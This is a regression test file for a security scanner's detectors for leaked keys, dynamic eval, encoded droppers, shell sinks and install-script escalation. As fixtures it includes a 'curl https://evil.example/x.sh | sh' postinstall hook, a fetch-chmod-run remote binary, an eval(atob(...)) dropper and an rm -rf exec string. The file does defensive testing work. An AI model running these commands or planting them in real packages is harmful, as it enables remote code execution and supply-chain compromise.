import { test } from 'node:test';
import assert from 'node:assert/strict';
import { scanSurface } from '../src/engine.js';
import { analyzeProvenance } from '../src/detectors/supplyChain.js';
import type { PackageMeta, ServerSurface } from '../src/types.js';

/**
 * Regression tests for the C/D/F precision audit (methodology 1.8, full-population
 * audit of all 1,052 low-grade servers). Each guard below both KILLS a proven
 * false-positive class AND keeps a genuine threat — the two assertions per block.
 */

async function scan(files: { path: string; content: string }[]) {
  return scanSurface({ tools: [], prompts: [], resources: [], sourceFiles: files } as unknown as ServerSurface);
}
const findBy = (r: any, id: string) => r.findings.filter((f: any) => f.ruleId === id);
const b64url = (o: unknown) => Buffer.from(JSON.stringify(o)).toString('base64url');
const jwt = (payload: unknown) => `${b64url({ alg: 'HS256', typ: 'JWT' })}.${b64url(payload)}.c2lnc2lnMTI`;

// ── MTC-SRC-008 — the confirmed-high grade gate ──────────────────────────────

test('SRC-008: AWS documentation example key is not a leaked secret', async () => {
  const r = await scan([{ path: 'src/config.js', content: 'const key = "AKIAIOSFODNN7EXAMPLE";' }]);
  assert.equal(findBy(r, 'MTC-SRC-008').length, 0, 'AKIAIOSFODNN7EXAMPLE is a placeholder, not a leak');
});

test('SRC-008: a real AWS key in runtime code stays high/confirmed (gates)', async () => {
  const r = await scan([{ path: 'src/config.js', content: 'const key = "AKIA3KPVXQZFMRNLWDGH";' }]);
  const f = findBy(r, 'MTC-SRC-008');
  assert.equal(f.length, 1);
  assert.equal(f[0].confidence, 'confirmed', 'a genuine live key must remain confirmed');
  assert.equal(f[0].severity, 'high');
});

test('SRC-008: a real key in a TEST file is a fixture — downgraded, cannot gate', async () => {
  const r = await scan([{ path: 'lib/__tests__/keys.test.js', content: 'const key = "AKIA3KPVXQZFMRNLWDGH";' }]);
  const f = findBy(r, 'MTC-SRC-008');
  assert.equal(f.length, 1);
  assert.equal(f[0].confidence, 'heuristic', 'a fixture secret is not confirmed');
  assert.equal(f[0].severity, 'low');
  assert.match(f[0].title, /test\/example\/packaging/);
});

test('SRC-008: a Supabase anon (public-by-design) JWT is hygiene, not a confirmed leak', async () => {
  const r = await scan([{ path: 'src/db.js', content: `const anon = "${jwt({ role: 'anon', iss: 'supabase' })}";` }]);
  const f = findBy(r, 'MTC-SRC-008');
  assert.equal(f.length, 1);
  assert.equal(f[0].confidence, 'heuristic');
  assert.notEqual(f[0].severity, 'high');
});

test('SRC-008: a Supabase service_role JWT is a real credential (confirmed)', async () => {
  const r = await scan([{ path: 'src/db.js', content: `const key = "${jwt({ role: 'service_role', iss: 'supabase' })}";` }]);
  const f = findBy(r, 'MTC-SRC-008');
  assert.equal(f.length, 1);
  assert.equal(f[0].confidence, 'confirmed');
});

test('SRC-008: the jwt.io John-Doe sample token is not a secret', async () => {
  const r = await scan([{ path: 'src/x.js', content: `const t = "${jwt({ sub: '1234567890', name: 'John Doe' })}";` }]);
  assert.equal(findBy(r, 'MTC-SRC-008').length, 0);
});

test('SRC-008: a Google/Firebase web API key is a client key, not a gating leak', async () => {
  const r = await scan([{ path: 'src/firebase.js', content: 'const apiKey = "AIzaSyD9xKp3QvB7nRmT2wLzF8gHjc4YeUoPqAB";\nconst authDomain = "x.firebaseapp.com";' }]);
  const f = findBy(r, 'MTC-SRC-008');
  assert.equal(f.length, 1);
  assert.equal(f[0].confidence, 'heuristic');
  assert.notEqual(f[0].severity, 'high');
});

// ── MTC-SRC-010 — dynamic eval of a non-literal ──────────────────────────────

test('SRC-010: receiver .eval / $eval / redis.eval are not dynamic JS eval', async () => {
  for (const c of ['return page.$eval(sel, fn);', 'return page.$$eval(sel, fn);', 'redis.eval(luaScript, 1, key);', 'client.eval(SCRIPT, keys);', 'globalThis.eval(expr);']) {
    assert.equal(findBy(await scan([{ path: 'src/x.js', content: c }]), 'MTC-SRC-010').length, 0, `should not fire: ${c}`);
  }
});

test('SRC-010: wasm-bindgen new Function(getStringFromWasm0(...)) glue is not eval', async () => {
  const r = await scan([{ path: 'src/wasm.js', content: 'const f = new Function(getStringFromWasm0(ptr, len));' }]);
  assert.equal(findBy(r, 'MTC-SRC-010').length, 0);
});

test('SRC-010: an `eval(` inside a string literal (scanner rule/example) is data', async () => {
  const r = await scan([{ path: 'src/rules.js', content: 'rules.push("dangerous: eval(userInput) must be flagged");' }]);
  assert.equal(findBy(r, 'MTC-SRC-010').length, 0);
});

test('SRC-010: a genuine bare eval(var) / new Function(var) still fires', async () => {
  assert.ok(findBy(await scan([{ path: 'src/x.js', content: 'const out = eval(wrappedCode);' }]), 'MTC-SRC-010').length >= 1);
  assert.ok(findBy(await scan([{ path: 'src/x.js', content: 'const f = new Function(dynamicBody);' }]), 'MTC-SRC-010').length >= 1);
});

// ── MTC-SRC-004 — obfuscated / encoded payload ───────────────────────────────

test('SRC-004: a bare hex/char-code data literal (no decoder+exec) is not a payload', async () => {
  const hex = await scan([{ path: 'src/table.js', content: `const t = "${'\\x61'.repeat(10)}";` }]);
  assert.equal(findBy(hex, 'MTC-SRC-004').length, 0);
  const cc = await scan([{ path: 'src/table.js', content: 'const t = String.fromCharCode(72,101,108,108,111,44,32,87,111,114,108,100);' }]);
  assert.equal(findBy(cc, 'MTC-SRC-004').length, 0);
});

test('SRC-004: a genuine decode-then-execute dropper still fires', async () => {
  assert.ok(findBy(await scan([{ path: 'src/x.js', content: 'eval(atob("ZXZpbA=="));' }]), 'MTC-SRC-004').length >= 1);
});

// ── MTC-SRC-009 — assembled command sink ─────────────────────────────────────

test('SRC-009: a DB .exec() (receiver / SQL keyword / private field) is not a shell sink', async () => {
  for (const c of [
    'sql.exec(stmt + ";");',
    'db.exec(`SAVEPOINT ${name}`);',
    'this.#o.exec(`\\nPRAGMA journal_mode=WAL`);',
    'this.ctx.storage.sql.exec(query + ";");',
  ]) {
    assert.equal(findBy(await scan([{ path: 'src/db.ts', content: c }]), 'MTC-SRC-009').length, 0, `should not fire: ${c}`);
  }
});

test('SRC-009: an exec( inside a string literal (scanner data) is not executed', async () => {
  const r = await scan([{ path: 'src/rules.js', content: 'const p = "exec(`rm -rf ${x}`)";' }]);
  assert.equal(findBy(r, 'MTC-SRC-009').length, 0);
});

test('SRC-009: a genuine assembled shell command still fires', async () => {
  assert.ok(findBy(await scan([{ path: 'src/run.ts', content: 'execSync(`git checkout ${ref}`);' }]), 'MTC-SRC-009').length >= 1);
});

// ── MTC-SUP-010 — install-script escalation ──────────────────────────────────

const metaWith = (postinstall: string): PackageMeta =>
  ({ name: 'x', scripts: { postinstall }, repositoryUrl: 'https://github.com/x/x' } as unknown as PackageMeta);
const sup010 = (m: PackageMeta) => analyzeProvenance(m).filter((f) => f.ruleId === 'MTC-SUP-010');

test('SUP-010: a console.log install banner containing a URL/.sh is output-only (low)', () => {
  const f = sup010(metaWith(`node -e "console.log('memoir installed. Run: memoir activate — https://memoir.sh')"`));
  assert.equal(f.length, 1);
  assert.equal(f[0].severity, 'low', 'a printed banner is not a remote-binary dropper');
});

test('SUP-010: a real curl|sh install hook is high/confirmed', () => {
  const f = sup010(metaWith('curl https://evil.example/x.sh | sh'));
  assert.equal(f.length, 1);
  assert.equal(f[0].severity, 'high');
});

test('SUP-010: a fetch-then-chmod+run remote binary escalates to medium', () => {
  const f = sup010(metaWith('curl -o t https://x.example/bin && chmod +x t && ./t'));
  assert.equal(f.length, 1);
  assert.equal(f[0].severity, 'medium');
});
